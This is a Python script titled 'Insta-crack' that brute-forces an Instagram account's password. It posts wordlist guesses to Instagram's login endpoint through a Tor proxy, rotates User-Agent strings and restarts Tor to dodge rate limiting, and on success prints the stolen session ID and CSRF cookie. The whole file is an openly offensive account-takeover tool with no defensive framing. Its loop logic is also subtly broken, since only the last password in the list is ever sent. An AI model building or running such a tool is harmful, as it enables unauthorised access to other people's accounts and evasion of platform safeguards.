#!/bin/python3
# -*- coding: utf-8 -*-

import requests
import getpass
import json
import io
from time import sleep
from datetime import datetime
import os

link = 'https://www.instagram.com/'
login_url = 'https://www.instagram.com/accounts/login/ajax/'


print('''
      ▄█████████████████████████▄
    ▄█▀░█░█░█░░░░░░░░░░░░░░░░░░░▀█▄
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░█░█░█░░░░░░░░░░░░░░█████░░█
    █░░░░░░░░░▄▄▄█████▄▄▄░░░░░░░░░█
    ███████████▀▀░░░░░▀▀███████████
    █░░░░░░░██░░▄█████▄░░██░░░░░░░█
    █░░░░░░░██░██▀░░░▀██░██░░░░░░░█       Insta-crack
    █░░░░░░░██░██░░░░░██░██░░░░░░░█
    █░░░░░░░██░██▄░░░▄██░██░░░░░░░█    
    █░░░░░░░██▄░▀█████▀░▄██░░░░░░░█
    █░░░░░░░░▀██▄▄░░░▄▄██▀░░░░░░░░█
    █░░░░░░░░░░▀▀█████▀▀░░░░░░░░░░█       By: Liam Wood
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    ▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄█▀
    ──▀█████████████████████████▀──  
                                                 ''')

time = int(datetime.now().timestamp())
response = requests.get(link)
csrf = response.cookies['csrftoken']
print("_" * 50)
username = input('Username: ')
pwl = input('Enter password list: ')
print("_" * 50)
passw = open(pwl).readlines()
uh = open('userh.txt').readlines()
sleep(10)

proxies = {'http': 'socks5://127.0.0.1:9050',
           'https': 'socks5://127.0.0.1:9050'}

while True:

    for line in passw:
        password = line.strip()
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'

        }
    for line in uh:
        h = line.strip()
        login_header = {
            "User-Agent": h,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf,
        }

        login_response = requests.post(login_url, data=payload, headers=login_header, timeout=3, proxies=proxies)
        json_data = json.loads(login_response.text)

        try:

            if json_data["authenticated"]:

                print("_" * 50)
                print("login successful")
                cookies = login_response.cookies
                cookie_jar = cookies.get_dict()
                csrf_token = cookie_jar['csrftoken']
                print("csrf_token: ", csrf_token)
                session_id = cookie_jar['sessionid']
                print("session_id: ", session_id)
                print(payload)
                print("_" * 50)
                exit()

            else:
                print("login failed ")


        except KeyError:
            print("Reseting Tor")
            os.system('sudo service tor restart')
            sleep(20)
